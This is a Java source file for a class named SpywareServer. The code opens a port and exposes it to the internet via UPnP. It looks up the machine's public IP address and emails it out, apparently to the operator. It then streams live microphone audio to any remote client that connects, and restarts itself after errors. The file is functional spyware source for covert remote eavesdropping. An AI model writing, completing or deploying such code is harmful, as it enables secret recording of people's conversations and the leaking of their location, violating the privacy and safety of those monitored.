package Backend;

import com.dosse.upnp.UPnP;

import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.TargetDataLine;
import java.io.BufferedReader;
import java.io.DataOutputStream;
import java.io.IOException;
import java.io.InputStreamReader;
import java.net.ServerSocket;
import java.net.Socket;
import java.net.URL;

public class SpywareServer implements Runnable {
    private boolean outVoice = true;
    private AudioFormat format = getAudioFormat();
    private ServerSocket serverSocket;
    private TargetDataLine mic;


    static AudioFormat getAudioFormat() {
        float sampleRate = 16000.0F;
        int sampleSizeBits = 16;
        int channels = 1;

        return new AudioFormat(sampleRate, sampleSizeBits, channels, true, true);
    }

    private void runSender() throws IOException {
        try {
            System.out.println("Creating Socket...");
            serverSocket = new ServerSocket(993);
            UPnP.openPortTCP(993);
            URL whatismyip = new URL("http://checkip.amazonaws.com");
            BufferedReader in = new BufferedReader(new InputStreamReader(
                    whatismyip.openStream()));
            String ipaddr = in.readLine();
            Backend.SendEmail.initSending(ipaddr);
            System.out.println("Starting sending server.");
            Socket server = serverSocket.accept();
            System.out.println("Listening for information.");
            DataOutputStream out = new DataOutputStream(server.getOutputStream());
            DataLine.Info micInfo = new DataLine.Info(TargetDataLine.class, format);
            mic = (TargetDataLine) AudioSystem.getLine(micInfo);
            mic.open(format);
            System.out.println("Data line open.");
            byte[] tmpBuff = new byte[mic.getBufferSize() / 5];
            mic.start();
            while (outVoice) {
                int count = mic.read(tmpBuff, 0, tmpBuff.length);
                if (count > 0) {
                    out.write(tmpBuff, 0, count);
                }
            }
            mic.drain();
            mic.close();
            System.out.println("Stopped listening from mic.");
        } catch (Exception e) {
            System.out.println("Error occurred:" + e.getMessage());
            serverSocket.close();
            mic.close();
            runSender();
        }
    }

    @Override
    public void run() {
        try {
            runSender();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
